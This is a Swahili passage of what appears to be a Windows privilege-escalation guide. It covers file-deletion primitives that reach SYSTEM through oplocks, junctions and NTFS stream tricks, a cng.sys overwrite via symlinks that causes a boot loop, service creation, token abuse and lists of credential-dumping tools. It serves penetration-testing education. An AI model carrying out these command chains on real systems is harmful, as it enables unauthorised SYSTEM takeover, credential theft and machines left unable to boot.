### Kutoka kwa Kufuta/Kuhamisha/Kubadilisha Jina kwa Faili Holela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) hudhani unaweza kufuta **folda nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu **kufuta faili yoyote kiholela** tu?

Unaweza kutumia **vipengele vya ndani vya NTFS**: kila folda ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Mtiririko huu huhifadhi **metadata ya faharasa** ya folda.

Kwa hivyo, ukifuta mtiririko wa `::$INDEX_ALLOCATION` wa folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako hairuhusu kufuta files/folders kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- **oplock** husitisha utekelezaji kwa muda mchakato wenye upendeleo unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Washa mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofika kwenye `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huacha `folder1` ikiwa tupu bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Badilisha `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** ndani ya `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uundaji wa Folda Mahali Popote hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda mahali popote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode ya `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Hukuta folda, hushindwa kutatua driver halisi, na mfumo huanguka au kuwasha hukwama.
- Hakuna fallback wala recovery bila uingiliaji wa nje (kwa mfano, boot repair au ufikiaji wa diski).

### Kutoka kwa njia za logi/backup zenye privileged access + OM symlinks hadi overwrite ya faili yoyote / boot DoS

Wakati **huduma yenye privileged access** inaandika logi/export kwenye njia inayosomwa kutoka kwa **config inayoweza kuandikwa**, elekeza upya njia hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wenye privileged access kuwa overwrite ya faili yoyote (hata **bila SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye privileged access inayoandika kwenye njia hiyo (logi, export, ripoti).

**Mfano wa mnyororo**
1. Soma config ili kubaini mahali panapoandikiwa logi yenye privileged access, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin anachochea “tuma SMS ya majaribio”). Sasa uandishi unaishia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa upya (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia driver iliyobadilishwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa sehemu ya kutegemewa ya kusababisha DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha process ya High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwasha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell ukitumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato ambao tayari una High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa michakato iliyolindwa) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato huo, na kuunda **mchakato wowote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata michakato ya SYSTEM isiyo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kupandisha privileges kwenye `getsystem`. Mbinu hii inahusisha **kuunda pipe kisha kuunda/kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service), na kupata privileges za SYSTEM.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ikiwa ungependa kuona mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifaulu **ku-hijack dll** inayopakiwa na **mchakato** unaoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa kutumia permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na pia ni rahisi zaidi kuitekeleza kutoka kwenye mchakato wa high integrity kwa kuwa utakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Tool bora zaidi ya kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Hutambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mashine ya ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Hutambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hunasa passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows enumeration ya msingi kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitajika ku-compile kwa kutumia VisualStudio) ([**iliyokwisha compile**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host kutafuta misconfigurations (ni zaidi zana ya kukusanya taarifa kuliko privesc) (inahitajika ku-compile) **(**[**iliyokwisha compile**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyokwisha compile inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyokwisha compile inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kutokana na chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa ku-compile mradi kwa kutumia toleo sahihi la .NET ([angalia hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - mwongozo wa haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa hadaa kupitia SMTP kwa kutumia Word VBA macro → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa Mfumo wa Faili wenye Privilege upo kwenye mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kujaribu Symbolic Link – matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha Masharti ya Mbio ya CLDFLT na DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive kamili ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya Ufutaji wa Faili Holela ili Kuongeza Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya siku moja](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Usasishaji za Kampuni kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Usasishaji za Kampuni kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Kuongeza Privilege kwa Kufuta Folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia Hatua Zako Kurudi hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri kuhusu Privilege Escalation inayotokana na shared-memory offsets za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
